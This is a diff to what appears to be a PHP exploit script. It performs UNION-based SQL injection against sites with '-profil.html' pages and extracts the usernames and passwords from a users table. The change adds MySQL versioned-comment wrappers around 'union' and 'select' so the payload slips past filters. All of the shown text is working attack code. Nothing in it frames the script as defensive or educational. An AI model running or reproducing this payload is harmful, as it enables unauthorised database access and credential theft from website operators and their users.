@@ -6,7 +6,7 @@ require_once "Console/Table.php";
 
 function exploit($url) {
     $url_replace = str_replace("-profil.html", "", $url);
-    $response = file_get_contents($url_replace."'union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x3C6C693E,username,password)),@)--+-profil.html");
+    $response = file_get_contents($url_replace."'/*!12345union*/+/*!12345select*/+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x3C6C693E,username,password)),@)--+-profil.html");
     preg_match('/<meta name="description" content="(.*?)">/', $response, $data);
     preg_match_all("/<li>,(.*?),(.*?),/", $data[1], $empas);
     preg_match('/statis-(.*?)-profil.html/', $url, $inject_point);
